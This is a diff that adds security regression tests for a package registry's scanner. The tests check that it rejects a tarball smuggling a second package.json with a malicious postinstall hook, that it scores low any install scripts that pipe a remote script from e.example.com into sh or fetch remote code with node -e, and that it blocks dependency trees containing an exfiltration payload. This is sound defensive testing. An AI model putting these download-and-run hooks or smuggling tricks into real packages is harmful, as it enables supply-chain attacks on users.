@@ -146,3 +146,90 @@ describe("~safe never lets an unscored version through", () => {
     expect(r.code).not.toBe(0);
   });
 });
+
+describe("council round 2: Sol and DeepSeek findings", () => {
+  let reg: Registry;
+  let alice: string;
+  beforeAll(async () => {
+    reg = await startRegistry({ now: () => clock });
+    alice = await addUser(reg, "alice", PASSWORD);
+  });
+  afterAll(async () => {
+    await reg?.stop();
+  });
+
+  test("a tarball with two package.json entries is refused (manifest smuggling)", async () => {
+    const { mkdirSync, writeFileSync, readFileSync } = await import("node:fs");
+    const base = mkdtempSync(join(work, "dup-"));
+    const clean = { name: "dup-manifest", version: "1.0.0", main: "index.js", license: "MIT" };
+    const dirty = { ...clean, scripts: { postinstall: "node evil.js" } };
+    for (const [dir, pj] of [["a", clean], ["b", dirty]] as const) {
+      mkdirSync(join(base, dir, "package"), { recursive: true });
+      writeFileSync(join(base, dir, "package", "package.json"), JSON.stringify(pj));
+      writeFileSync(join(base, dir, "package", "index.js"), "module.exports=1;\n");
+      writeFileSync(join(base, dir, "package", "evil.js"), "1;\n");
+    }
+    const tar = join(base, "x.tar");
+    const sh = (cmd: string[]) => run(cmd, { cwd: base, env: { PATH: process.env.PATH ?? "" } });
+    expect((await sh(["tar", "-cf", tar, "-C", join(base, "a"), "package/package.json", "package/index.js"])).code).toBe(0);
+    expect((await sh(["tar", "-rf", tar, "-C", join(base, "b"), "package/package.json", "package/evil.js"])).code).toBe(0);
+    const tgz = Bun.gzipSync(new Uint8Array(readFileSync(tar)));
+    const body = {
+      _id: "dup-manifest",
+      name: "dup-manifest",
+      "dist-tags": { latest: "1.0.0" },
+      versions: { "1.0.0": clean },
+      _attachments: { "dup-manifest-1.0.0.tgz": { content_type: "application/octet-stream", data: Buffer.from(tgz).toString("base64"), length: tgz.length } },
+    };
+    const r = await getJson(`${reg.url}dup-manifest`, { method: "PUT", headers: { "content-type": "application/json", authorization: `Bearer ${alice}` }, body: JSON.stringify(body) });
+    expect(r.status).toBeGreaterThanOrEqual(400);
+    expect((await getJson(`${reg.url}dup-manifest`)).status).toBe(404);
+  });
+
+  test("a one-line download-and-run install script scores below the floor", async () => {
+    expect((await publish(reg, alice, { name: "one-liner", version: "1.0.0", scripts: { postinstall: "curl -s https://e.example.com/x.sh | sh" } })).code).toBe(0);
+    expect((await publish(reg, alice, { name: "node-e-liner", version: "1.0.0", scripts: { postinstall: "node -e \"require('https').get('https://e.example.com/x', r => r.pipe(process.stdout))\"" } })).code).toBe(0);
+    clock += 2 * DAY;
+    for (const n of ["one-liner", "node-e-liner"]) {
+      const s = await getJson(`${reg.url}-/apm/v1/score/${n}/1.0.0`);
+      expect(Number(dig(s.body, "score")), n).toBeLessThan(40);
+    }
+  });
+
+  test("apm add refuses a package whose dependency tree contains a dangerous version", async () => {
+    const { apm } = await import("./harness");
+    expect((await publish(reg, alice, { name: "bad-leaf", version: "1.0.0", scripts: { postinstall: "node x.js" }, files: { "index.js": "module.exports=1;\n", "x.js": EXFIL } })).code).toBe(0);
+    expect((await publish(reg, alice, { name: "middle-layer", version: "1.0.0", dependencies: { "bad-leaf": "^1.0.0" } })).code).toBe(0);
+    expect((await publish(reg, alice, { name: "top-level-pkg", version: "1.0.0", dependencies: { "middle-layer": "^1.0.0" } })).code).toBe(0);
+    clock += 2 * DAY;
+    const sb = makeSandbox(reg, alice);
+    const app = writeConsumer(work, reg, alice, {});
+    const r = await apm(["add", "top-level-pkg"], { cwd: app, env: sb.env });
+    expect(r.code).not.toBe(0);
+    expect(r.out).toContain("bad-leaf");
+    const { installedVersion } = await import("./harness");
+    expect(installedVersion(app, "top-level-pkg")).toBeNull();
+  });
+
+  test("with only APM_REGISTRY set, the package manager installs from the same registry apm checked", async () => {
+    const { apm, hostKey, installedVersion } = await import("./harness");
+    const { writeFileSync } = await import("node:fs");
+    expect((await publish(reg, alice, { name: "apm-only-pkg-zz9", version: "1.0.0" })).code).toBe(0);
+    clock += 2 * DAY;
+    const home = mkdtempSync(join(tmpdir(), "apm-bare-home-"));
+    writeFileSync(join(home, ".npmrc"), `${hostKey(reg.url)}:_authToken=${alice}\n`);
+    const app = mkdtempSync(join(work, "bare-app-"));
+    writeFileSync(join(app, "package.json"), JSON.stringify({ name: "bare-app", version: "1.0.0", private: true }));
+    const env: Record<string, string> = {
+      PATH: `${join(import.meta.dir, "..", "..", "node_modules", ".bin")}:${process.env.PATH ?? ""}`,
+      HOME: home,
+      BUN_INSTALL_CACHE_DIR: join(home, ".bun-cache"),
+      npm_config_cache: join(home, ".npm-cache"),
+      NO_COLOR: "1",
+      APM_REGISTRY: reg.url,
+    };
+    const r = await apm(["add", "apm-only-pkg-zz9"], { cwd: app, env });
+    expect(r.code, r.out).toBe(0);
+    expect(installedVersion(app, "apm-only-pkg-zz9")).toBe("1.0.0");
+  });
+});
